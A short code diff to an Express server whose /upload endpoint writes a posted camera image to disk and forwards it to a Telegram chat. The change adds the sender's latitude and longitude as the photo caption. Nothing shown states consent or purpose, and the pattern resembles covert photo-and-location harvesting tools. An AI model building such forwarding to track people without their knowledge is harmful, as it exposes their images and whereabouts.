@@ -9,7 +9,7 @@ const PORT = process.env.PORT || 3001;
 app.use(bodyParser.json({ limit: '10mb' }));
 
 app.post('/upload', async (req, res) => {
-  const { image } = req.body;
+  const { image, latitude, longitude } = req.body;
   const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
   const filePath = 'temp.jpg';
   fs.writeFileSync(filePath, base64Data, 'base64');
@@ -20,6 +20,7 @@ app.post('/upload', async (req, res) => {
     const formData = new FormData();
     formData.append('chat_id', chatId);
     formData.append('photo', fs.createReadStream(filePath));
+    formData.append('caption', `Location: (${latitude}, ${longitude})`);
 
     await axios.post(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, formData, {
       headers: formData.getHeaders()
